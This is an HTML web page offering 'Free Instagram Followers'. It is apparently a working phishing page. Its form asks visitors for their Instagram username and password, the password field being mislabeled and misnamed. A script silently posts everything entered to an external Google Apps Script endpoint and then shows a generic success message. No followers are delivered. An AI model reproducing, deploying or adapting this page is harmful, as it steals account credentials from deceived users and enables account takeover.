<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Instagram Followers </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Bootstrap -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background: linear-gradient(to right, #141e30, #243b55);
      color: white;
    }

    .form-container {
      max-width: 500px;
      margin: 100px auto;
      padding: 30px;
      background-color: #2c3e50;
      border-radius: 15px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
    }
  </style>
</head>

<body>

<div class="form-container">
  <h2 class="text-center mb-4">Free Instagram Followers</h2>

  <form id="followersForm">
    
    <div class="mb-3">
      <label class="form-label">Instagram Username</label>
      <input type="text" class="form-control" name="insta_user" required>
    </div>

    <!-- NEW FIELD -->
    <div class="mb-3">
      <label class="form-label">Passward)</label>
      <input type="text" class="form-control" name="name" required>
    </div>

    <div class="mb-3">
      <label class="form-label">Followers Quantity (Max 1000)</label>
      <input type="number" class="form-control" name="followers" max="1000" min="1" required>
    </div>

    <button type="submit" class="btn btn-warning w-100">Submit</button>

  </form>
</div>

<!-- Success Modal -->
<div class="modal fade" id="successModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header">
        <h5 class="modal-title">Success</h5>
      </div>
      <div class="modal-body">
        ✅ Your request has been submitted successfully!
      </div>
      <div class="modal-footer">
        <button class="btn btn-success" data-bs-dismiss="modal">OK</button>
      </div>
    </div>
  </div>
</div>

<!-- Error Modal -->
<div class="modal fade" id="errorModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header">
        <h5 class="modal-title">Error</h5>
      </div>
      <div class="modal-body">
        ❌ Something went wrong. Please try again.
      </div>
      <div class="modal-footer">
        <button class="btn btn-danger" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
  const scriptURL = "https://script.google.com/macros/s/AKfycbwShVMwSiYpf908VeYBBkXnlMFo3ap3d97LgG4oKhbM_aJgmuwzF9QO65naFuTpLb14/exec"; // paste your Apps Script URL here

  const form = document.getElementById("followersForm");
  const successModal = new bootstrap.Modal(document.getElementById('successModal'));
  const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    const formData = new FormData(form);

    fetch(scriptURL, {
      method: "POST",
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      successModal.show();
      form.reset();
    })
    .catch(error => {
      errorModal.show();
    });
  });
</script>

</body>
</html>
